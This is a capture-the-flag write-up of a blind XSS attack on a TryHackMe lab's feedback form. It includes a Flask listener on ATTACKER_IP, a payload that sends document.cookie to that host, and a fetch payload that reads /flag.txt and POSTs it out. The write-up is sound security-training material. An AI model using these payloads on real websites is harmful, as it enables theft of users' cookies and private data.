---
layout: default
title: The Sticker Shop THM - Write up
theme: hacker
---

# The Sticker Shop THM - Write up (Easy)

## Description
Can you read the flag at http://10.10.102.26:8080/flag.txt?

## Accessing http://10.10.102.26:8080
There is home page and one feedback page.

![image](https://github.com/user-attachments/assets/b9cfa04d-081c-4b59-8fef-717107a3bba8)

most likely we have to put our payload on the feedback page.

## Trying to access http://10.10.102.26:8080/flag.txt
![flag.txt](https://github.com/user-attachments/assets/9d160fb6-df50-41bd-8cc2-adebbaf590d0)

it returns "401 Unauthorized".

## Trying XSS
Common Reflected XSS playloads didnt work for me in the feedback page. so I accessed the hint which says "Can you conduct any client-side exploitation in order to read the flag?". 
I became certain that there is XSS in the page. I tried for blind XSS.

### Creating a server
I Created a simple server using flask.

![image](https://github.com/user-attachments/assets/b51c2017-5a94-424b-be59-5e132a634a54)

Code: 
```
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def capture_flag():
    data = request.data.decode('utf-8')
    print(f"Received data: {data}")
    return 'Data received!', 200

if __name__ == '__main__':
    app.run(host='ATTACKER_IP', port=8000)
```
### Running the server
![image](https://github.com/user-attachments/assets/84e46136-cae4-4683-91e4-4078c506cb07)

### Putting the payload
![image](https://github.com/user-attachments/assets/c841d029-aa28-4c46-84fc-7a22251ead9a)

payload:
```
<script>document.location='http://ATTACKER_IP:8000/xss?cookie=' + document.cookie</script>
```
Enter the payload and click submit.

### Output
![image](https://github.com/user-attachments/assets/f1780783-0d26-4fbb-8d0e-ae540c56086f)

The paylaod works, the website doesnt use cookies so theres no cookie showing.

## Getting the flag

### Putting the payload
![image](https://github.com/user-attachments/assets/051da70d-5c1a-4434-bc7e-46843c5c6e6c)

payload for the flag:
```
<script>
    fetch('/flag.txt')
        .then(res => res.text())
        .then(flag => fetch('http://ATTACKER_IP:8000', {method: 'POST', body: flag}));
</script>
```
click submit.

### output
![image](https://github.com/user-attachments/assets/43386fd9-82d9-4abf-8e81-105357d232e9)

got the flag.









